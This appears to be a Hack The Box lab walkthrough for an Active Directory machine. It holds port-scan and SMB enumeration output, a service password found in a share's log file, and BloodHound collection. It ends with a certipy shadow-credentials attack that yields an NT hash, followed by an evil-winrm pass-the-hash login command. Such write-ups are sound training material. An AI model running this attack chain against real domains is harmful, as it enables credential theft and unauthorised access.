

We have some creds given on HTB 

wallace.everette / Welcome2026@

sudo nmap -A --min-rate 5000 10.129.245.130
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-10 04:32 EDT
Nmap scan report for 10.129.245.130
Host is up (0.17s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-10 15:32:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-10T15:33:45+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-06-10T15:33:46+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-06-10T15:33:45+00:00; +7h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-10T15:33:46+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/10%OT=53%CT=1%CU=32732%PV=Y%DS=2%DC=T%G=Y%TM=6A29216
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=102%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=103%GCD=1%ISR
OS:=10A%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=1%ISR=105%TI=I%CI=I%II=I%SS
OS:=S%TS=U)SEQ(SP=109%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M552NW8
OS:NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)WIN(
OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF
OS:%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R
OS:=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)
OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2026-06-10T15:33:39
|_  start_date: N/A

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   174.52 ms 10.10.14.1
2   174.59 ms 10.129.245.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.00 seconds


smbmap -H logging.htb -u wallace.everette -p"Welcome2026@"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.245.130:445	Name: logging.htb         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Logs                                              	READ ONLY	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	WSUSTemp                                          	NO ACCESS	A network share used by Local Publishing from a Remote WSUS Console Instance.
[*] Closed 1 connections                         


Logs share look interesting

smbclient //logging.htb/Logs -U wallace.everette%Welcome2026@
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 16 19:10:09 2026
  ..                                  D        0  Thu Apr 16 19:10:09 2026
  Audit_Heartbeat.log                 A     1294  Thu Apr 16 19:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 19:10:09 2026
  Service_State.log                   A      468  Thu Apr 16 19:10:09 2026
  TaskMonitor.log                     A     1170  Thu Apr 16 19:10:09 2026

we will get all the files 

and enumerate through it

1. IdentitySync_Trace_20260219.log
HR01.logging.htb
BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025" 

SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
┌─[eu-dedivip-4]─[10.10.15.120]─[chirlelakanda@htb-cwvxtuynvk-htb-cloud-com]─[~/Desktop/logging]
└──╼ [★]$ netexec smb logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION 
┌─[eu-dedivip-4]─[10.10.15.120]─[chirlelakanda@htb-cwvxtuynvk-htb-cloud-com]─[~/Desktop/logging]
└──╼ [★]$ netexec winrm logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'
WINRM       10.129.245.130  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) 
WINRM       10.129.245.130  5985   DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025
┌─[eu-dedivip-4]─[10.10.15.120]─[chirlelakanda@htb-cwvxtuynvk-htb-cloud-com]─[~/Desktop/logging]
└──╼ [★]$ netexec winrm logging.htb -u wallace.everette -p 'Welcome2026@'
WINRM       10.129.245.130  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) 
WINRM       10.129.245.130  5985   DC01             [-] logging.htb\wallace.everette:Welcome2026@
┌─[eu-dedivip-4]─[10.10.15.120]─[chirlelakanda@htb-cwvxtuynvk-htb-cloud-com]─[~/Desktop/logging]


BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025" 

Not working currently now we will do enum using bloodhound

bloodhound-python -u wallace.everette -p 'Welcome2026@' -d logging.htb -ns 10.129.245.130 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: logging.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.logging.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.logging.htb
INFO: Found 14 users
INFO: Found 57 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.logging.htb
INFO: Done in 00M 35S


uploading and next will be in bloodhound

synced the time with dc 

└──╼ [★]$ certipy-ad shadow auto \
-account msa_health$ \
-k \
-target dc01.logging.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc01.logging.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: LOGGING.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'msa_health$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2d227571faf8455aa1cf09439394fe46'
[*] Adding Key Credential with device ID '2d227571faf8455aa1cf09439394fe46' to the Key Credentials for 'msa_health$'
[*] Successfully added Key Credential with device ID '2d227571faf8455aa1cf09439394fe46' to the Key Credentials for 'msa_health$'
[*] Authenticating as 'msa_health$' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'msa_health$@logging.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'msa_health.ccache'
[*] Wrote credential cache to 'msa_health.ccache'
[*] Trying to retrieve NT hash for 'msa_health$'
[*] Restoring the old Key Credentials for 'msa_health$'
[*] Successfully restored the old Key Credentials for 'msa_health$'
[*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5




evil-winrm -i dc01.logging.htb -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
